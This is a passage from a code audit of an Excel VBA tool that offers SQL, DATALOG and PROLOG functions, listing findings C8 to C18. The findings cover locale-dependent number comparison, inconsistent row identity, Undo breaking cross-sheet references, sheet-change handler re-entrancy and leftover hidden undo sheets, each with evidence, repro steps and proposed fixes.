- Fix direction: make the index unique per *keyed atom*, not per top-level item. For example, thread a ByRef counter through `DesugarBodyItem` and use `anonPrefix & itemIndex & "_" & atomSeq & "C" & j`. An alternative is a per-clause fresh counter.
- Ratchet-able?: partly. A check could flag any recursive `DesugarBodyItem` call that passes the caller's `itemIndex` unchanged. A test is better: one keyed atom in each of C and T, each omitting the same column index.

### C8 — Numeric literals are compared by spelling, so `0.50`, `3.0`, `+5`, `05` and `.5` never match the same number from a Table or from `is`

*high · confirmed by reading · PROLOG, slice finding 3*

**Related:** C41

- Class: correctness / Severity: **high** / Verdict: **CONFIRMED** (the reader keeps tokens raw: `VLA.bas:2315` `ParseForm = t`; nothing in `ParseProgram` or `ExpandListSugarInto` canonicalises a leaf)
- Where: `src/VLA_Prolog.bas:6019-6023` (`ExpandListSugarInto` leaf branch), `:7847-7853` (`TableCellToTerm`), `:4336` (`is`), `VLA_Unify.bas:333` (text compare)
- Evidence:
```vba
If Not IsObject(term) Then
    dest = term            ' a numeric literal keeps exactly the spelling the user typed
```
```vba
UnifyTwoWay = (CStr(aw) = CStr(bw))   ' leaves compare as text
```
- Failure scenario: every number the engine *produces* goes through `NumberToTerm` (a Table cell, the result of `is`, `length`, `sum-list`, the index in `nth`). A number the user *writes* keeps its spelling. The module states the opposite in several places ("`3.0` and `3` are the SAME ground atom "3"": `:263`, `:2446`, `:2534`, `:4556`). That holds only for computed values. Examples:
  - `(query (rates (rate 0.50) (name N)))` against a cell holding 0.5 returns no rows silently. The quoted-versus-bare post-hoc diagnosis does not cover number spelling.
  - `(sum-list (list 0.25 0.25) 0.50)` answers no. RELEASES claims this exact family was fixed for `0.5`.
  - `(length L 3.0)` and `(nth 2.0 L X)` fail silently, because the computed "3"/"2" is unified against "3.0"/"2.0". Meanwhile `(between 1 3 2.0)` succeeds, since `between`'s test mode compares values.
  - `(fact (price w 3.0)) (query (price w 3))` returns nothing.

  In ISO, `0.5 = 0.50` is true, so the `0.50` cases are also a deviation from standard Prolog.
- Live repro: a Table `Rates` with a numeric cell 0.5 and `=PROLOG("(query (rates (rate 0.50) (name N)))", Rates)`. Expected one row; it returns none. Also `=PROLOG("(query (sum-list (list 0.25 0.25) 0.50))")`, which returns FALSE.
- Dedupe: I grepped "0.50", "3.0", "canonical", "normalise" and "literal" in the roadmaps, RELEASES and the module. The PROLOG.18 note only fixed the `.5` rendering of *computed* numbers. Not filed.
- Fix direction: canonicalise at parse time. In `ExpandListSugarInto`'s leaf branch (every fact, head, body and query passes through it), replace any unmarked leaf where `LeafIsNumberTerm` is true with `NumberToTerm(InvariantVal(leaf))`. Then "3.0 and 3 are the same ground atom" becomes true everywhere.
- Ratchet-able?: a test is better. A cheap static rule: every leaf-producing parse path must call one canonicaliser.

### C9 ✔ — DATALOG `(sum ...)` converts values with `CDbl`: locale-dependent totals, TRUE summed as -1, raw "Type mismatch" on text

*high · confirmed by reading · SQL and DATALOG, slice finding 1* · *re-read by the assembling session*

**Related:** C10, C41

- Class: 5 (Numeric/type, locale). Severity: **HIGH**. Verdict: CONFIRMED by reading. Live repro still needed for the locale half.
- Where: src/VLA_Datalog.bas:2388 (ComputeAggregateGroups).
- Evidence:
```vba
            Else
                Dim addend As Double
                addend = CDbl(arr(valuePos))
```
  Fact values are always VBA Strings: the reader keeps every atom as text (see the VLA.bas:317-324 note). `CDbl("1.5")` follows the Windows locale. Everywhere else, DATALOG converts numbers through `InvariantVal`, `IsInvariantNumericString` and `BuiltinOperandIsNumeric` (the `let` and comparison paths, VLA_Relation.AsInvariantDouble). SUM is the only arm that does not, and it validates nothing before converting.
- Failure scenario:
  1. On a de-DE machine, `(fact (amount tom 1.5)) (fact (amount tom 2.5)) (rule (total X S) (person X) (sum S (amount X V)))` gives **40**, not 4. `CDbl("1.5")` reads `.` as a thousands separator and returns 15.
  2. On any locale, a Table column of TRUE/FALSE sums to -(count of TRUE), silently.
  3. A text cell such as "n/a" in the summed column produces `#DATALOG! Type mismatch`. That is a raw error: no catalogue id, and it names neither the row nor the column.
  4. On en-US, a text cell "1,234" sums as 1234, even though `IsInvariantNumericString` would call it non-numeric in a comparison.
- Live repro: set Windows Region to German, then enter `=DATALOG("(fact (person tom)) (fact (amount tom 1.5)) (rule (total X S) (person X) (sum S (amount X V))) (query total)")`. Expect 1.5 (a single fact), actual 15. Second test: a Table with a Boolean column summed with `sum`.
- Dedupe: grepped `ComputeAggregateGroups`, `CDbl`, `sum` and `comma-decimal`. The roadmap covers ComputeAggregateGroups only for performance (DATALOG.13/14). PROLOG.18/30 fixed the same locale class for PROLOG's `is`, not for DATALOG's sum. Not filed.
- Fix direction: route the value through `BuiltinOperandIsNumeric`. On success, convert with `AsInvariantDouble`-equivalent code (`CDbl` only for a real numeric VarType, `InvariantVal` for strings). Otherwise refuse with a new `datalog-sum-non-numeric-value` naming the predicate. VLA_Relation.AccumulateAggValue already does exactly this check for SQL.
- Ratchet-able: yes. Flag `CDbl(` in VLA_Datalog/VLA_Sql/VLA_Relation/VLA_Prolog unless it sits on the line after a `ValueIsNumericType(...)` guard, or keep an allowlist. Today VLA_Datalog has four `CDbl` sites: 826 and 2390 are guarded or already Double, 3984 is Long math, 2388 is the bug.

### C10 — DATALOG matches rule constants and facts against table numbers by `CStr` spelling, so fractional matches depend on the locale

*high · confirmed by reading · SQL and DATALOG, slice finding 2*

**Related:** C9, C12

- Class: 5/6 (locale, type identity). Severity: **HIGH**. Verdict: CONFIRMED by reading. Live repro needed on a comma-decimal locale.
- Where:
  - src/VLA_Datalog.bas:1910 (PlanMatches, constant filter), :2271 (FilterOutMatching negation probe = constant text), :2309 (KeyFromPositions, aggregate group keys).
  - src/VLA_Relation.bas:288/300 (TupleKey/PartialKey, the join/dedup/`not` identity).
  - The integer grounder's `VlaSymInternSpelling(syms, CStr(arr(i)))` (VLA_Datalog.bas:3743).
- Evidence:
```vba
        If cmp(i) = 0 Then
            If StrComp(txt(i), CStr(tup(pos(i))), vbBinaryCompare) <> 0 Then Exit Function
```
  `txt(i)` is the constant exactly as written ("0.5"). `tup(pos(i))` is a Table Double, and `CStr(0.5)` is "0,5" on a comma-decimal Windows. The same module already knows this. DATALOG.11's `DatalogValueText` (line 824) deliberately uses `InvariantNumberText` so that "0.5 reads 0.5 on every machine" for text tests. The row-matching path never adopted it, so one module now has two "number as text" policies.
- Failure scenario: on de-DE, a Table `rates` holds `(a, 0.5)`, with the rule `(rule (half X) (rates X 0.5))`. The spill is empty with no refusal; on en-US it returns `a`. The same thing happens in these cases:
  - `(fact (target a 0.5))` joined against the Table.
  - `(not (rates X 0.5))`, which keeps rows it should drop.
  - A grouping key that contains a fraction.
- Live repro: on a German-locale Windows, make Table `rates` with columns Name|Rate and row a|0.5 (a real number cell). Enter `=DATALOG("(rule (half X) (rates X 0.5)) (query half)", rates)`.
- Dedupe: PROLOG.18/PROLOG.30 ("CStr is locale-following, '0,5'", BETA_REARVIEW ~16589) fixed PROLOG's `is`, NumberToTerm and TableCellToTerm, and DATALOG.11 fixed text tests only. EN.4 covers the English reader, not engine tuple identity. Not filed for DATALOG matching or joins.
- Fix direction: build tuple keys and plan comparisons from one `ValueSpelling(v)`: `InvariantNumberText` for a real numeric VarType, `CStr` otherwise. Use it in TupleKey, PartialKey, PlanMatches, KeyFromPositions and SymClassOf/VlaSymIntern, so a Table 0.5 and a typed 0.5 share a spelling on every machine. This also changes SQL's DISTINCT/GROUP BY keys (finding 4); decide both together.
- Ratchet-able: yes. Forbid bare `CStr(` on tuple data in VLA_Relation/VLA_Datalog key builders (the functions named above) and require the shared spelling helper.

### C11 — SQL `/` is always real division; SQLite divides two integers as integers

*high · confirmed by reading · SQL and DATALOG, slice finding 3*

- Class: 5 (Numeric). Severity: **HIGH** (silent different numbers under the "SQLite-leaning" claim in README.md:173 and MARKETING.md). The fix may be a documented decision rather than code. Verdict: CONFIRMED by reading.
- Where: src/VLA_Relation.bas:1481 (`ComputeArithmetic = ln / rn`), reached from VLA_Sql.EvalScalar NK_ARITH (VLA_Sql.bas ~2415).
- Evidence:
```vba
    Case "/"
        If rn = 0 Then ...
        ComputeArithmetic = ln / rn
```
- Failure scenario: `SELECT Qty / 4 AS packs FROM stock` with Qty = 7 returns 1.75; SQLite returns 1. `SELECT COUNT(*) / 3 AS g FROM t` over 10 rows returns 3.333…; SQLite returns 3. A user who pastes a query from a SQLite tool (the README's stated scenario) gets different numbers with no warning. No comment, message or roadmap item states that `/` is always real. The only integer-division operator is `//`, and SQL does not expose it.
- Live repro: a Table with Qty=7, then `=SQL("SELECT Qty / 4 AS p FROM t", t)`.
- Dedupe: grepped "integer division", "7/2" and "real division" in both roadmaps, README and the SQL header. Nothing found.
- Fix direction: the owner decides. Either (a) document it as a named deviation in the SQL header, README and `sql-unsupported-keyword` text (Excel cells are all Doubles, so "real division" is defensible), or (b) apply SQLite's rule: integer quotient when both operands are whole numbers from integer-typed sources. Option (b) is hard because Value2 carries no integer/real distinction, which argues for (a) plus a pin test.
- Ratchet-able: no (semantic decision). A pin test in TestSql would hold whichever choice is made.

### C12 — Row identity is the `CStr` spelling in DISTINCT, GROUP BY, UNION/INTERSECT/EXCEPT and JOIN ... ON keys, but exact typed comparison in WHERE and residual ON

*high · confirmed by reading · SQL and DATALOG, slice finding 4*

**Related:** C10, C13

- Class: 10 (two copies of equality that have drifted) + 5. Severity: **HIGH**. Verdict: CONFIRMED by reading.
- Where:
  - src/VLA_Relation.bas:285-301 (TupleKey/PartialKey, used by RelTryAdd for DISTINCT, UNION and CombineSetOp, and by RelJoin for ON equi-keys).
  - src/VLA_Relation.bas:1631-1636 (GroupKeyFromPositions for GROUP BY).
  - Contrast: src/VLA_Relation.bas:1368-1382 (CompareValues: exact Double when both are numeric, otherwise `CStr` text).
  - Split point: VLA_Sql.WalkOnTerm (~2627). `col = col` becomes a hash key; anything else becomes a residual EvalBool.
- Evidence:
```vba
Private Function TupleKey(ByRef t() As Variant) As String
    ...
        r = r & CStr(t(i)) & Chr$(31)
```
- Failure scenarios (SQLite keeps each pair apart):
  - (a) One column holds the number 1 in one row and the text "1" in another, which is common after a CSV paste. `SELECT DISTINCT Code` returns one row, `GROUP BY Code` returns one group (keyed by whichever came first), and `A UNION B` loses a row.
  - (b) Doubles that agree to 15 significant digits (a cell `=0.1+0.2` against a typed 0.3, or two computed IDs) merge in GROUP BY and match in `JOIN b ON a.x = b.x`. The logically identical `JOIN b ON a.x = b.x + 0` goes through the residual path, so it does **not** match, and neither does `WHERE a.x = 0.3`.
  - (c) The Boolean TRUE and the text "True" are the same row.
  - (d) On de-DE, the number 1.5 and the text "1,5" collide. On en-US, 1.5 and "1.5" collide. The result depends on the locale.
- Live repro: a Table with column X containing `=0.1+0.2` and `0.3` (a typed number). `=SQL("SELECT X, COUNT(*) AS n FROM t GROUP BY X", t)` gives 1 group of 2; SQLite gives 2 groups. Also try `=SQL("SELECT DISTINCT X FROM t", t)`.
- Dedupe: the Relation header documents spelling identity for DATALOG facts and OPTIMIZE ("AN ID IS A SPELLING"; OPTIMIZE.3 flags the 1/"1" ambiguity for its own grounder only). SQL.2 says it reuses RelTryAdd "as a ready-made case-sensitive whole-row dedup set", and no SQL item names the type or precision conflation or the ON-vs-WHERE disagreement. Not filed.
- Fix direction: give SQL a typed key, for example `VarType & ":" & spelling`, with numbers spelled at full round-trip precision (17 significant digits via `InvariantNumberText`-style formatting). Use it for RelTryAdd, PartialKey and GroupKeyFromPositions on the SQL path, or add a `typed` flag to the shared builders. Then `ON a.x = b.x` and `WHERE a.x = b.x` agree by construction.
- Ratchet-able: partly. A pure pin test with (1, "1") and (0.1+0.2, 0.3) rows through DISTINCT, GROUP BY, UNION and ON-vs-WHERE would hold it.

### C13 — A number compared with text falls back to `CStr` text order, which makes MIN/MAX and ORDER BY depend on row order, the comparison non-transitive, and the answer locale-dependent

*high · confirmed by reading · SQL and DATALOG, slice finding 5*

**Related:** C12

- Class: 5/6. Severity: **HIGH** (MIN/MAX return a different value); ORDER BY is medium. Verdict: CONFIRMED by reading.
- Where:
  - src/VLA_Relation.bas:1382 (CompareValues text branch).
  - :1668-1677 (AccumulateAggValue MIN/MAX).
  - src/VLA_Sql.bas:2879 (CompareOneValue, used by the merge sort).
  - VLA_Sql.EvalBool NK_CMP.
- Evidence:
```vba
        c = StrComp(CStr(l), CStr(r), vbBinaryCompare)
```
  SQLite orders every number before every text. Here, "10a" < 9 (text "10a" < "9"), 9 < 10 (numeric) and 10 < "10a" (text). That is a cycle.
- Failure scenario:
  - A Qty column holds 9, 10 and the text "10a" in that row order. `SELECT MIN(Qty)` returns "10a"; with the order 9, "10a", 10 it returns 10. SQLite always returns 9. MIN and MAX keep a running "best", so the answer depends on row order.
  - `ORDER BY Qty` over a mixed column: merge sort with a non-transitive comparator produces an order that changes when source rows are re-sorted.
  - `WHERE Qty > 9` excludes the text cell "10" (numbers stored as text). SQLite includes it, because TEXT > INTEGER.
  - A Double against a string literal (`WHERE Price = '1.5'`) goes through `CStr(1.5)`, which is "1,5" on de-DE. INTRINSICS #2 says never `CStr` on numbers.
- Live repro: a Table Qty with 9, 10 and '10a (text). Run `=SQL("SELECT MIN(Qty) AS m FROM t", t)`, then sort the Table rows and recalculate.
- Dedupe: blank-vs-number is SQL.9's. Number-vs-text ordering is not mentioned in SQL.4/SQL.5 (they state "the identical numeric-vs-text policy WHERE/HAVING already use" as a virtue). Not filed.
- Fix direction: when exactly one side is numeric, use SQLite's class order (number < text), and never compare a number's `CStr`. With numbers first, CompareOneValue and the MIN/MAX accumulator become a total order. DATALOG's lenient policy can keep its own behaviour behind the `bothNumeric` parameter.
- Ratchet-able: no. Add a pin test for the cycle above.

### C14 — Blank cells come back as 0 in every SQL and DATALOG spill

*high · confirmed in code, live effect needs repro · SQL and DATALOG, slice finding 6*

**Roadmap link:** Extends SQL.9 (blank cells in WHERE and aggregates); this is the output side.

- Class: 5. Severity: **HIGH** (silent wrong data in the cell). Extends SQL.9, but it is a separable, one-line output fix. Verdict: PLAUSIBLE. The code path is CONFIRMED; Excel rendering Empty array elements as 0 is standard UDF behaviour but needs a live look.
- Where: src/VLA_Sql.bas:3897 (BuildSpilledArray `out(r, i) = rowArr(i)`); src/VLA_Relation.bas:1243 and the headless branch ~1215 (RelToSpilledArray).
- Evidence: RangeToRows keeps Value2 `Empty` for a blank cell (VLA_Relation.bas:876). The spill builders copy it straight into the returned Variant array.
- Failure scenario:
  - `=SQL("SELECT Name, Manager FROM staff", staff)`: the CEO's blank Manager shows **0**.
  - `SELECT MIN(Bonus)` with a blank Bonus returns Empty (text-compare "" < everything), which shows as **0**. SQLite skips the NULL.
  - `SELECT *` over any sparse Table fills its holes with zeros, which then feed downstream formulas as real zeros.
- Live repro: a Table with one blank cell, then `=SQL("SELECT * FROM t", t)`.
- Dedupe: SQL.9 covers blank-cell comparison and aggregate semantics. It does not mention output rendering, and no item says "shows 0".
- Fix direction: in both spill builders, map `IsEmpty(v)` to `""` (Excel's own "looks blank" convention for formulas). Pin one host test. The MIN/MAX half belongs to SQL.9.
- Ratchet-able: no. Add a pin test.

### C15 ✔ — Undo and the automatic put-back after a stopped run turn every outside reference to a restored sheet into #REF!

*high · confirmed by reading · Host, IDE and build, slice finding 1* · *re-read by the assembling session*

**Related:** C63

- Class: 10 (design) / 3. Severity: **high** (silent, permanent damage to formulas on sheets the run never touched). Verdict: CONFIRMED in code. Needs a live repro to watch Excel's rename-then-delete behaviour on the dependants.
- Where: src/VLA_IDE.bas:3444 `PutBackLastRun`, specifically :3507 and :3529. It is called from `EnglishIdeUndo` (:3401) and, since U.25, from `ReportStoppedRun` (:1414) on **every** run that stops part-way.
- Evidence:
```vba
If SheetExists(hb, orig) Then
    hb.Worksheets(orig).Name = UNDO_PREFIX & "old"      ' :3507 - dependants follow the rename
    setAside = True
End If
...
snap.Copy After:=snap
...
cpy.Name = orig
...
If SheetExists(hb, UNDO_PREFIX & "old") Then
    hb.Worksheets(UNDO_PREFIX & "old").Delete            ' :3529 - dependants now point at a deleted sheet
End If
```
- Failure scenario: A workbook has `Summary!B1 = SUM(Output!B:B)`, a defined name `Rates = Budget!$A$1:$A$12`, and a chart over `Budget`. The program says "Work on sheet Budget." and stops on line 5 (any refusal). U.25 calls `PutBackLastRun`. Renaming `Budget` to `VLAu_old` rewrites every dependant to `VLAu_old!...`. Deleting `VLAu_old` turns them all into `#REF!`. The restored copy named `Budget` is a different sheet object, so nothing re-points to it. The same happens to cross-sheet references inside the restored copy itself (`=Budget!A1` in a snapshot sheet follows the rename too). Excel's own Ctrl+Z cannot recover this, because a macro clears the undo stack. The user asked for "put it back" and got a workbook whose summary sheets are broken. Undo also renames tables on the copied sheet (`Table1` becomes `Table13`), which breaks structured references that point at them.
- Live repro (for the owner): In a workbook, put `=Output!A1` on Sheet1. Write a program that puts 5 in A1 and then stops with a refusal (for example `Go to sheet Nowhere.` outside a Try). Interpret and Run. After the "put back" message, Sheet1!A1 reads `=#REF!A1`. Undo Last Run on a successful run gives the same result.
- Dedupe: Grepped BETA_REARVIEW/2 for `#REF`, `VLAu_old`, `undo.*formula`, `dependent`. U.19/U.21/U.23 fix *which* sheet gets renamed and rolled back, but none of them looks at references into the sheet being restored. Not filed.
- Fix direction: Restore **contents** into the existing sheet object instead of replacing the object: clear it, then `snap.UsedRange.Copy orig.Range(same address)` or copy `.Formula`/`.Value` plus formats. Only a sheet the run *created* (tombstones) should be deleted. If a whole-sheet swap stays, refuse Undo when `orig` has dependants (scan `hb.Names`, and `Precedents` across sheets for formulas that mention `orig`) and say so in words.
- Ratchet-able?: Partly. A static check could flag `.Name = ... & "old"` followed by `.Delete` on a user sheet. The real guard would be a host test: a sheet whose formula refers to Output survives Undo.

#### Independent second account (Interpreter and runtime, slice finding 2)

- Class: 8/2 (a recovery path destroys data) / Severity: **high** (silent corruption of sheets the program never touched) / Verdict: code path **CONFIRMED**; the Excel side is **PLAUSIBLE** (it is standard Excel delete semantics, but was not run here)
- Where: `src/VLA_IDE.bas:3506-3530` (`PutBackLastRun`), `3216` (the snapshot `Copy`). This is reached from `EnglishIdeUndo` and from `ReportStoppedRun:1414`, which fires automatically on every stopped Run (U.25).
- Evidence:
```vba
        If SheetExists(hb, orig) Then
            hb.Worksheets(orig).Name = UNDO_PREFIX & "old"     ' refs elsewhere follow the rename
        ...
        snap.Copy After:=snap
        ...
        cpy.Name = orig
        ...
            hb.Worksheets(UNDO_PREFIX & "old").Delete           ' ...and now point at a deleted sheet
```
- Failure scenario: A workbook has `Summary!B1 = SUM(Data!C:C)`, a workbook name `Rates = Data!$A$1:$B$9`, a chart on Summary plotting Data, and a Table `Sales` on Data. The program says "Go to sheet Data." (so Data is snapshotted) and stops at a later step, or the user clicks Undo. The restore renames Data to `VLAu_old`, and every dependent follows the rename. It then copies the snapshot in as a new sheet called `Data` and deletes `VLAu_old`. The result: `Summary!B1` is `#REF!`, `Rates` refers to `=#REF!`, the chart series break, and the pivot cache source is invalid. Table names must be unique per workbook, so the snapshot copy and then the restored copy each get a new auto-generated name (`Sales` becomes `Sales2`/`Sales3`), and structured references and Frazaro's own `=SQL/=DATALOG/=PROLOG(..., Sales)` formulas break. The Undo dialog then says "Put back the way it was before the last Run". The same mechanism means "Delete sheet X" is not reversible, even though Undo reports that it put X back.
- Live repro: Make Data with 1 in A1, and `Summary!A1 = Data!A1`. Program: `Go to sheet Data.` / `Put 2 into cell A1.`. Run it, then Undo Last Run. Expect `Summary!A1 = 1`. Predicted result: `#REF!`.
- Dedupe: I grepped the roadmaps, LESSONS and TRENCHES for `#REF`, "undo" with "name/table/chart", and "cross-sheet". Nothing covers it. U.19/U.21/U.22/U.23/U.25 are about which copy gets renamed, not about dependents. LESSONS V's "Undo resurrects deleted sheets" states the opposite of this.
- Fix direction: Restore contents into the existing sheet object: clear its cells, then copy the snapshot's `UsedRange` (values, formulas, formats) back with `Range.Copy`. That keeps the sheet's identity, so dependents survive. Where a sheet object has to be recreated (a deleted sheet), say plainly that references to it cannot be restored. Record and restore ListObject names explicitly.
- Ratchet-able?: Not statically. It needs a host test that puts a cross-sheet formula, a workbook name and a Table on a snapshotted sheet, runs Undo, and asserts they survive.

### C16 — A "When the sheet changes:" handler re-enters the interpreter in the middle of a run and clobbers the outer run's module state

*high · confirmed in code, live effect needs repro · Host, IDE and build, slice finding 2*

**Related:** C17

- Class: 9 (re-entrancy, global mutable state). Severity: **high** (silently wrong values or wrong procedures in the outer run, plus the outer program's handler registration silently swapped). Verdict: CONFIRMED in code. PLAUSIBLE live, since it depends on SheetChange firing synchronously on a VBA `Range.Value` write (it does in Excel).
- Where: src/VLA_IDE.bas:1289 `InterpretProgram` (runs at :1352 with events **on**; no `EnableEvents` anywhere in VLA_IDE) and :1670 `CliRunCaptured`. Then src/VLA_EventSink.cls:41 → src/VLA_Events.bas:131, :140 → src/VLA_Interpreter.bas:507 `VlaInterpretEntry` → :451 `PrepareInterpret`, which resets module globals.
- Evidence:
```vba
' VLA_Interpreter.PrepareInterpret - runs again inside the outer run
mAtLine = 0
Set mModuleFrame = frame          ' outer procedures' global reads (:1716) now hit the handler's frame
Set mEffectLog = New Collection   ' outer run's trace / debug-print record wiped
mErrMode = "" : mErrLabel = ""    ' outer (on-error ...) state dropped
Set mProcs = New Collection       ' outer program's procedures replaced by the handler program's
```
```vba
' VLA_IDE.InterpretProgram, after the outer run
VLA_Interpreter.VlaInterpret vla, hb
If VLA_Interpreter.VlaHasProc("on:sheet-change") Then   ' reads mProcs - may be the HANDLER's
    VLA_Events.VlaRegisterSheetChangeHandler hb, vla    ' registers THIS program's text
End If
```
- Failure scenario: Program A (sheet "Frazaro") declares `When the sheet changes: ...`. Interpreting it once registers A for workbook W. Program B (sheet "Frazaro (b)") has no handler. B declares `total`, has an action `To bump: increase total by 1.`, and writes a cell before calling `bump`. B's first cell write fires SheetChange, and `VlaInterpretEntry(A)` runs inside B's `VlaInterpret`. Afterwards, (a) `bump` resolves against A's `mProcs` and fails with `interp-entry...`/unknown-procedure, or a same-named A procedure runs instead. (b) B's global lookups at :1716 read A's module frame, so `total` is unbound or holds A's value. (c) `mAtLine` has been reset, so a later stop names the wrong row, which breaks SD-5. (d) Interpret and Trace shows only effects logged after the last handler firing. (e) Once B finishes, `VlaHasProc("on:sheet-change")` answers from A's procedures and registers **B's** source as W's sheet-change handler. A's handler is silently gone, and every later edit raises `interp-entry-proc-not-found` into `Debug.Print`. The handler also runs once per cell B writes: N writes cost N full compile-and-interpret runs of A.
- Live repro: Use two program sheets as above, with A's handler body `Log "fired".`. Interpret A, then Interpret and Trace B (B writes 3 cells and then calls an action that uses a variable). Expect a wrong or missing variable or an unknown procedure in B. Afterwards, edit any cell: nothing fires, and the Immediate window shows `interp-entry-proc-not-found`.
- Dedupe: Grepped for `re-entr`, `reentr`, `EnableEvents`, `sheet-change` in both roadmaps. IN.7 records the EnableEvents bracket *inside* the dispatcher (which stops the handler re-firing itself) and "fires for ANY sheet change in the workbook". Nothing covers a handler firing *during another interpret run*. F.5 (compiler reentrancy) is VLA.bas-only. Not filed.
- Fix direction: Add a module-level `mRunDepth` guard in VLA_Interpreter: `VlaInterpretEntry` returns without doing anything (or queues) while a run is in progress. Or bracket `InterpretProgram`/`CliRunCaptured`/`DoCheck` in a save-and-restore `Application.EnableEvents = False`, like VlaDispatchSheetChange does. Take the `VlaHasProc` answer from the run's own compiled forms, not from the global `mProcs`.
- Ratchet-able?: Yes. A check can require every `VLA_Interpreter.VlaInterpret(` call site in VLA_IDE to sit inside an EnableEvents bracket, or can assert that `PrepareInterpret` checks a depth counter.

#### Independent second account (Interpreter and runtime, slice finding 8)

- Class: 9 (re-entrancy) / Severity: **medium** / Verdict: **PLAUSIBLE** (needs a live event)
- Where: `src/VLA_Events.bas:131-150` (the dispatch has no "run in progress" guard). `src/VLA_Interpreter.bas:451-476`: `PrepareInterpret` resets `mModuleFrame`, `mProcs`, `mErrMode`, `mCaught*`, `mEffectLog`, `mAtLine` and `mHostWorkbook`. `src/VLA_IDE.bas:1340-1352`: `InterpretProgram` runs with `EnableEvents` left on.
- Evidence:
```vba
    Set mModuleFrame = frame
    Set mEffectLog = New Collection
    ...
    mErrMode = ""
```
- Failure scenario: The program declares "When the sheet changes:" and is interpreted once, which registers the handler. On the second Interpret, the first cell write fires `SheetChange`, and `VlaInterpretEntry` → `PrepareInterpret` runs in the middle of the outer statement. Back in the outer run:
  - module consts (for example `hot-pink`) are gone for procedure calls, because `mModuleFrame` is now the handler's frame, which never ran the top-level `const` forms;
  - an armed Try is disarmed (`mErrMode=""`), so an error it was meant to catch stops the Run;
  - a stop reports line 0 (TER-10);
  - the trace window shows the handler's effect log.
- Live repro: `When the sheet changes: log "chg".` + `Define hot-pink as "#FF69B4".` + `To paint: make cell A1 hot-pink.` + `Put 1 into cell B1.` + `Paint.`. Interpret twice. The second run is predicted to fail at Paint.
- Dedupe: I grepped for reentr, re-entr and "sheet-change". F.5 notes that the compiler is not reentrant. The interpreter's re-entrancy under its own event feature is not filed.
- Fix direction: Either set `Application.EnableEvents = False` around `VlaInterpret` in `InterpretProgram` (and `RunProgram`), restoring it on every exit, or have the dispatchers skip while a module-level "running" flag is set. Ideally both, plus making interpreter state a per-run context object (the F.5 `VlaFrame` pattern).
- Ratchet-able?: Partly. A check could require every `VlaInterpret`/`Application.Run ... main` call site in VLA_IDE to sit inside an `EnableEvents` bracket.

### C17 — The sheet-change handler writes to whichever sheet is active, and Frazaro's own IDE writes trigger it. A handler can overwrite the program's own sentences.

*high · confirmed by reading · Host, IDE and build, slice finding 3*

**Related:** C16

- Class: 3 (implicit context) / 9. Severity: **high** (silent loss of program text or user data). Verdict: CONFIRMED in code.
- Where: src/VLA_EventSink.cls:41 throws away `Sh` and `Target`. src/VLA_Events.bas:140 passes only the workbook. The interpreter's `range`/`cells` are unqualified (src/VLA_Interpreter.bas:2114-2116: `Range(ArgAt(argVals, 0))`), so they resolve to `ActiveSheet`. The IDE's own cell writes then fire the handler: `MarkOK`/`MarkErr` (src/VLA_IDE.bas:3033), `LogParseFailure` (:3048), `RenderTraceReport` (:1844/:1854, one write per trace line), `ReportStoppedRun` (:1414ff).
- Evidence:
```vba
Private Sub mApp_SheetChange(ByVal Sh As Object, ByVal Target As Range)
    ...
    If Not wb Is Nothing Then VLA_Events.VlaDispatchSheetChange wb   ' Sh/Target dropped; no sheet activated
```
- Failure scenario: The program is `When the sheet changes: put the total of column D in B2.` The author meant the Output sheet, where every IDE run starts (:1340 `outWs.Activate`). After one Interpret the handler is armed. The user goes back to the "Frazaro" sheet and types a new sentence in B7. SheetChange fires, and the handler writes into **B2 of the Frazaro sheet**, replacing sentence 2. The program sheet is protected only during a run. Pressing Validate does the same thing: every `MarkOK` in column C fires the handler, and its write lands on the Frazaro sheet in the middle of the Check. "Interpret and Trace" writes one Trace cell per effect, so the handler runs once per trace line (a full recompile each time) against the Trace sheet. The handler also fires for writes to the very-hidden `VLA_Log`, while the active sheet belongs to the user.
- Live repro: Use the program above. Interpret it, then type anything in B10 of the Frazaro sheet. B2 now holds a number.
- Dedupe: BETA_REARVIEW (IN.7, around line 5025) records "fires for ANY sheet change anywhere in the registered WORKBOOK ... owner-confirmed harmless for now". That covers the trigger scope only. The *write target* (ActiveSheet, not Output and not `Sh`) and self-triggering by Frazaro's own IDE writes are not mentioned. This **extends IN.7's accepted scope note** and is not a re-report of it.
- Fix direction: Hand `Sh`/`Target` to the dispatcher. Skip changes on Frazaro's own sheets (`IsFrazaroSheetName`, :2712 already exists). Run the handler against a fixed sheet: activate Output, or bind `(range ...)` to an explicit sheet the way `InterpretProgram` intends. Combine this with the EnableEvents bracket from finding 2 around every IDE write.
- Ratchet-able?: Partly. A check can require that a `mApp_SheetChange` body forwards `Sh`. The IDE-write bracket can be ratcheted the same way as in finding 2.

### C18 — Undo snapshots and the parse-failure log stay in the user's workbook as very-hidden sheets, travel with it when shared, and cannot be cleared from the product

*high · confirmed by reading · Host, IDE and build, slice finding 5*

**Related:** C63

- Class: 7 (data exposure) / 10. Severity: **high** for confidentiality (the workbook the user shares contains data the user believes is gone). Verdict: CONFIRMED in code.
- Where: src/VLA_IDE.bas:3216-3226 (`TakeRunSnapshot` copies every target sheet to a very-hidden `VLAu_<tag>_<sheet>`). src/VLA_IDE.bas:3048-3073 (`LogParseFailure` writes every misunderstood sentence, verbatim with a timestamp, to very-hidden `VLA_Log`, up to 2000 rows). src/VLA_IDE.bas:5737 `EnglishIdeClearLog`, which **no ribbon button, menu item or caller reaches** (grep finds only its definition). Also src/VLA_IDE.bas:732 `PersistPhrasebookPath`, which writes absolute local paths into the `VLA_LoadedPhrasebooks` document property.
- Evidence:
```vba
hb.Worksheets(curTarget).Copy After:=hb.Worksheets(hb.Worksheets.Count)
...
snap.Name = sPre & curTarget
snap.Visible = xlSheetVeryHidden                     ' pre-run copy, kept until the NEXT run of this program
...
lg.Cells(nr, 3).Value = CStr(ws.Cells(r, 2).Value)   ' the sentence, verbatim
lg.Visible = xlSheetVeryHidden
```
